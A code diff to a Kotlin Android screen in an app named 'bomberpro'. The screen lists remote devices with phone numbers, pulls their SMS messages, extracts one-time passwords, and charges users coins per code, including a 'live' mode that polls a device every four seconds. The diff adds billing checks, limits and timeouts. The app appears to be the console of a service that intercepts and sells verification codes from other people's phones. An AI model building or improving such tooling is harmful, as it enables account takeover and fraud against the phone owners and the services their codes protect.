@@ -56,8 +56,10 @@ import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.text.input.KeyboardType
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+import com.sanji.bomberpro.FirebaseConfig
 import com.sanji.bomberpro.data.OtpMessage
 import com.sanji.bomberpro.services.Device
+import com.sanji.bomberpro.services.OtpFavorite
 import com.sanji.bomberpro.services.OtpFavoritesService
 import com.sanji.bomberpro.services.OtpService
 import com.sanji.bomberpro.services.RealtimeDbService
@@ -104,7 +106,7 @@ fun OtpScreen(
     var scanning by remember { mutableStateOf(false) }
     var error by remember { mutableStateOf<String?>(null) }
     var coins by remember { mutableStateOf(0) }
-    var otpCost by remember { mutableStateOf(1) }
+    var otpCost by remember { mutableStateOf(FirebaseConfig.DEFAULT_OTP_COST) }
     var searchQuery by remember { mutableStateOf("") }
     var resultList by remember { mutableStateOf<List<OtpMessage>>(emptyList()) }
     var resultAllMsgs by remember { mutableStateOf<List<OtpMessage>>(emptyList()) }
@@ -113,12 +115,16 @@ fun OtpScreen(
     var liveOtps by remember { mutableStateOf<List<OtpMessage>>(emptyList()) }
     var liveJob by remember { mutableStateOf<Job?>(null) }
     var liveCoinsSpent by remember { mutableStateOf(0) }
-    var favorites by remember { mutableStateOf<List<com.sanji.bomberpro.services.OtpFavorite>>(emptyList()) }
+    var livePauseReason by remember { mutableStateOf<String?>(null) }
+    var favorites by remember { mutableStateOf<List<OtpFavorite>>(emptyList()) }
     var keyword by remember { mutableStateOf("") }
     var keywordInput by remember { mutableStateOf("") }
     var loadingAction by remember { mutableStateOf(false) }
 
-    // Local function — must be declared before use
+    suspend fun refreshCoins() {
+        coins = userData.getCoins(uid)
+    }
+
     suspend fun scanDevices() {
         scanning = true
         error = null
@@ -139,8 +145,9 @@ fun OtpScreen(
     }
 
     LaunchedEffect(Unit) {
-        coins = userData.getCoins(uid)
-        otpCost = userData.getGlobalSettings().otpCost
+        refreshCoins()
+        val settings = userData.getGlobalSettings()
+        otpCost = settings.otpCost
         keyword = favSvc.getWatchKeyword(uid)
         keywordInput = keyword
         favorites = favSvc.listFavorites(uid)
@@ -156,7 +163,13 @@ fun OtpScreen(
         Row(verticalAlignment = Alignment.CenterVertically) {
             IconButton(onClick = {
                 if (view == OtpView.LIST) onBack()
-                else view = OtpView.LIST
+                else if (view == OtpView.LIVE) {
+                    // stopping live when navigating back
+                    liveRunning = false
+                    liveJob?.cancel()
+                    liveJob = null
+                    view = OtpView.DETAIL
+                } else view = OtpView.LIST
             }) {
                 Icon(Icons.Default.ArrowBack, "Back", tint = colors.onBackground)
             }
@@ -248,29 +261,51 @@ fun OtpScreen(
                                 try {
                                     val found = otpService.collectToday(dv)
                                     val all = otpService.collectAll(dv)
-                                    if (found.isNotEmpty() && !isAdmin) {
-                                        if (coins < otpCost) {
-                                            error = "Need $otpCost coins (have $coins)"
-                                        } else if (userData.deductCoins(uid, otpCost, "otp-fetch-new")) {
-                                            coins = userData.getCoins(uid)
-                                            val first = found.first()
-                                            userData.saveOtpHistory(
-                                                uid = uid,
-                                                otp = first.otps.firstOrNull() ?: "?",
-                                                sender = first.sender,
-                                                deviceName = dv.deviceName,
-                                                deviceShort = dv.shortId,
-                                                devicePhone = dv.phone ?: "",
-                                                firebaseLabel = dv.firebaseLabel,
-                                                mode = "new",
-                                                cost = otpCost,
-                                            )
+
+                                    if (found.isNotEmpty()) {
+                                        // success — deduct coins if not admin
+                                        if (!isAdmin) {
+                                            if (coins < otpCost) {
+                                                error = "Need $otpCost coins (have $coins)"
+                                                resultList = emptyList()
+                                                resultAllMsgs = all
+                                                lastMode = "new"
+                                                view = OtpView.RESULT
+                                                return@launch
+                                            }
+                                            if (!userData.deductCoins(uid, otpCost, "otp-fetch-new")) {
+                                                error = "Deduct failed"
+                                                resultList = emptyList()
+                                                resultAllMsgs = all
+                                                lastMode = "new"
+                                                view = OtpView.RESULT
+                                                return@launch
+                                            }
+                                            refreshCoins()
                                         }
+                                        val first = found.first()
+                                        userData.saveOtpHistory(
+                                            uid = uid,
+                                            otp = first.otps.firstOrNull() ?: "?",
+                                            sender = first.sender,
+                                            deviceName = dv.deviceName,
+                                            deviceShort = dv.shortId,
+                                            devicePhone = dv.phone ?: "",
+                                            firebaseLabel = dv.firebaseLabel,
+                                            mode = "new",
+                                            cost = if (isAdmin) 0 else otpCost,
+                                        )
+                                    } else {
+                                        // no OTP — no deduction, no refund needed
+                                        error = null
                                     }
+
                                     resultList = found
                                     resultAllMsgs = all
                                     lastMode = "new"
                                     view = OtpView.RESULT
+                                } catch (e: Exception) {
+                                    error = "Fetch failed: ${e.message}"
                                 } finally {
                                     loadingAction = false
                                 }
@@ -283,29 +318,49 @@ fun OtpScreen(
                                 try {
                                     val found = otpService.collectAllOtp(dv)
                                     val all = otpService.collectAll(dv)
-                                    if (found.isNotEmpty() && !isAdmin) {
-                                        if (coins < otpCost) {
-                                            error = "Need $otpCost coins (have $coins)"
-                                        } else if (userData.deductCoins(uid, otpCost, "otp-fetch-old")) {
-                                            coins = userData.getCoins(uid)
-                                            val first = found.first()
-                                            userData.saveOtpHistory(
-                                                uid = uid,
-                                                otp = first.otps.firstOrNull() ?: "?",
-                                                sender = first.sender,
-                                                deviceName = dv.deviceName,
-                                                deviceShort = dv.shortId,
-                                                devicePhone = dv.phone ?: "",
-                                                firebaseLabel = dv.firebaseLabel,
-                                                mode = "old",
-                                                cost = otpCost,
-                                            )
+
+                                    if (found.isNotEmpty()) {
+                                        if (!isAdmin) {
+                                            if (coins < otpCost) {
+                                                error = "Need $otpCost coins (have $coins)"
+                                                resultList = emptyList()
+                                                resultAllMsgs = all
+                                                lastMode = "old"
+                                                view = OtpView.RESULT
+                                                return@launch
+                                            }
+                                            if (!userData.deductCoins(uid, otpCost, "otp-fetch-old")) {
+                                                error = "Deduct failed"
+                                                resultList = emptyList()
+                                                resultAllMsgs = all
+                                                lastMode = "old"
+                                                view = OtpView.RESULT
+                                                return@launch
+                                            }
+                                            refreshCoins()
                                         }
+                                        val first = found.first()
+                                        userData.saveOtpHistory(
+                                            uid = uid,
+                                            otp = first.otps.firstOrNull() ?: "?",
+                                            sender = first.sender,
+                                            deviceName = dv.deviceName,
+                                            deviceShort = dv.shortId,
+                                            devicePhone = dv.phone ?: "",
+                                            firebaseLabel = dv.firebaseLabel,
+                                            mode = "old",
+                                            cost = if (isAdmin) 0 else otpCost,
+                                        )
+                                    } else {
+                                        error = null
                                     }
+
                                     resultList = found
                                     resultAllMsgs = all
                                     lastMode = "old"
                                     view = OtpView.RESULT
+                                } catch (e: Exception) {
+                                    error = "Fetch failed: ${e.message}"
                                 } finally {
                                     loadingAction = false
                                 }
@@ -327,39 +382,34 @@ fun OtpScreen(
                             }
                         },
                         onLive = {
+                            if (!isAdmin && coins < otpCost) {
+                                error = "Need $otpCost coins to start live mode"
+                                return@DeviceDetailSection
+                            }
                             liveOtps = emptyList()
                             liveCoinsSpent = 0
+                            livePauseReason = null
                             liveRunning = true
                             view = OtpView.LIVE
                             val startedTs = System.currentTimeMillis() / 1000L
+                            val maxLimit = FirebaseConfig.DEFAULT_LIVE_OTP_LIMIT
+                            val timeoutEnd = System.currentTimeMillis() + (FirebaseConfig.DEFAULT_LIVE_TIMEOUT_SEC * 1000L)
                             liveJob = scope.launch {
                                 try {
-                                    while (liveRunning) {
-                                        val newFound = otpService.collectSince(dv, startedTs)
-                                        val toAdd = newFound.filter {
-                                            !liveOtps.any { o -> o.hash == it.hash }
+                                    while (liveRunning && System.currentTimeMillis() < timeoutEnd) {
+                                        if (liveOtps.size >= maxLimit) {
+                                            livePauseReason = "Reached $maxLimit OTPs limit"
+                                            break
                                         }
+
+                                        val newFound = otpService.collectSince(dv, startedTs)
+                                        val toAdd = newFound.filter { o ->
+                                            !liveOtps.any { existing -> existing.hash == o.hash }
+                                        }
+
                                         if (toAdd.isNotEmpty()) {
                                             for (o in toAdd) {
-                                                if (!isAdmin) {
-                                                    if (coins >= otpCost) {
-                                                        if (userData.deductCoins(uid, otpCost, "otp-live")) {
-                                                            coins = userData.getCoins(uid)
-                                                            liveCoinsSpent += otpCost
-                                                            userData.saveOtpHistory(
-                                                                uid = uid,
-                                                                otp = o.otps.firstOrNull() ?: "?",
-                                                                sender = o.sender,
-                                                                deviceName = dv.deviceName,
-                                                                deviceShort = dv.shortId,
-                                                                devicePhone = dv.phone ?: "",
-                                                                firebaseLabel = dv.firebaseLabel,
-                                                                mode = "live",
-                                                                cost = otpCost,
-                                                            )
-                                                        }
-                                                    }
-                                                } else {
+                                                if (isAdmin) {
                                                     userData.saveOtpHistory(
                                                         uid = uid,
                                                         otp = o.otps.firstOrNull() ?: "?",
@@ -371,11 +421,39 @@ fun OtpScreen(
                                                         mode = "live",
                                                         cost = 0,
                                                     )
+                                                    continue
+                                                }
+                                                if (coins < otpCost) {
+                                                    livePauseReason = "Out of coins"
+                                                    break
+                                                }
+                                                if (userData.deductCoins(uid, otpCost, "otp-live")) {
+                                                    refreshCoins()
+                                                    liveCoinsSpent += otpCost
+                                                    userData.saveOtpHistory(
+                                                        uid = uid,
+                                                        otp = o.otps.firstOrNull() ?: "?",
+                                                        sender = o.sender,
+                                                        deviceName = dv.deviceName,
+                                                        deviceShort = dv.shortId,
+                                                        devicePhone = dv.phone ?: "",
+                                                        firebaseLabel = dv.firebaseLabel,
+                                                        mode = "live",
+                                                        cost = otpCost,
+                                                    )
+                                                } else {
+                                                    livePauseReason = "Deduct failed"
+                                                    break
                                                 }
                                             }
                                             liveOtps = liveOtps + toAdd
                                         }
+
+                                        if (livePauseReason != null) break
                                         delay(4000)
+                                    }
+                                    if (livePauseReason == null && System.currentTimeMillis() >= timeoutEnd) {
+                                        livePauseReason = "Time limit reached"
                                     }
                                 } catch (_: Exception) {}
                             }
@@ -403,6 +481,7 @@ fun OtpScreen(
                 coinsSpent = liveCoinsSpent,
                 coinsLeft = coins,
                 running = liveRunning,
+                pauseReason = livePauseReason,
                 onCopy = { code -> copyToClipboard("OTP", code) },
                 onStop = {
                     liveRunning = false
@@ -698,6 +777,14 @@ private fun FetchResultSection(
                     fontSize = 11.sp,
                     color = colors.onSurfaceVariant,
                 )
+                if (mode != "msgs") {
+                    Spacer(Modifier.height(4.dp))
+                    Text(
+                        text = "No coins charged for empty results.",
+                        fontSize = 11.sp,
+                        color = colors.success,
+                    )
+                }
                 Spacer(Modifier.height(12.dp))
                 TextButton(onClick = onBack) { Text("Back", color = colors.primary) }
             }
@@ -757,6 +844,7 @@ private fun LiveSection(
     coinsSpent: Int,
     coinsLeft: Int,
     running: Boolean,
+    pauseReason: String?,
     onCopy: (String) -> Unit,
     onStop: () -> Unit,
     onBack: () -> Unit,
@@ -771,14 +859,30 @@ private fun LiveSection(
                 Column(modifier = Modifier.weight(1f)) {
                     Text(
                         text = if (running) "🟢 Watching…" else "⏹ Stopped",
-                        fontSize = 14.sp, fontWeight = FontWeight.Bold, color = colors.primary,
+                        fontSize = 14.sp,
+                        fontWeight = FontWeight.Bold,
+                        color = colors.primary,
                     )
-                    Text("Poll every 4s · coins spent: $coinsSpent · left: $coinsLeft", fontSize = 11.sp, color = colors.onSurfaceVariant)
+                    Text(
+                        "Poll every 4s · coins spent: $coinsSpent · left: $coinsLeft",
+                        fontSize = 11.sp,
+                        color = colors.onSurfaceVariant,
+                    )
+                    if (pauseReason != null) {
+                        Text(
+                            "⏸ $pauseReason",
+                            fontSize = 11.sp,
+                            color = colors.warning,
+                        )
+                    }
                 }
                 if (running) {
                     Button(
                         onClick = onStop,
-                        colors = ButtonDefaults.buttonColors(containerColor = colors.error, contentColor = Color.White),
+                        colors = ButtonDefaults.buttonColors(
+                            containerColor = colors.error,
+                            contentColor = Color.White,
+                        ),
                     ) { Text("STOP") }
                 }
             }
@@ -788,7 +892,13 @@ private fun LiveSection(
 
         if (otps.isEmpty()) {
             Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
-                Text("Waiting for new OTPs…", color = colors.onSurfaceVariant, fontSize = 12.sp)
+                Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                    Text("Waiting for new OTPs…", color = colors.onSurfaceVariant, fontSize = 12.sp)
+                    if (pauseReason != null) {
+                        Spacer(Modifier.height(6.dp))
+                        Text(pauseReason, color = colors.warning, fontSize = 11.sp)
+                    }
+                }
             }
         } else {
             LazyColumn(verticalArrangement = Arrangement.spacedBy(8.dp)) {
@@ -830,7 +940,7 @@ private fun LiveSection(
 
 @Composable
 private fun FavoritesSection(
-    favorites: List<com.sanji.bomberpro.services.OtpFavorite>,
+    favorites: List<OtpFavorite>,
     onCopy: (String) -> Unit,
     onRemove: (String) -> Unit,
 ) {
@@ -851,8 +961,10 @@ private fun FavoritesSection(
                     Column(Modifier.weight(1f)) {
                         Text(
                             text = f.otp,
-                            fontSize = 16.sp, fontWeight = FontWeight.Bold,
-                            color = colors.primary, fontFamily = FontFamily.Monospace,
+                            fontSize = 16.sp,
+                            fontWeight = FontWeight.Bold,
+                            color = colors.primary,
+                            fontFamily = FontFamily.Monospace,
                         )
                         Text("📤 ${f.sender}", fontSize = 11.sp, color = colors.onBackground)
                         Text("🕐 ${formatIstShort(f.savedAt)}", fontSize = 10.sp, color = colors.onSurfaceVariant)
@@ -881,7 +993,8 @@ private fun KeywordSection(
     Column(verticalArrangement = Arrangement.spacedBy(12.dp)) {
         Text(
             "When any device message contains this keyword, you get alerted on next OTP fetch.",
-            fontSize = 12.sp, color = colors.onSurfaceVariant,
+            fontSize = 12.sp,
+            color = colors.onSurfaceVariant,
         )
         OutlinedTextField(
             value = keywordInput,
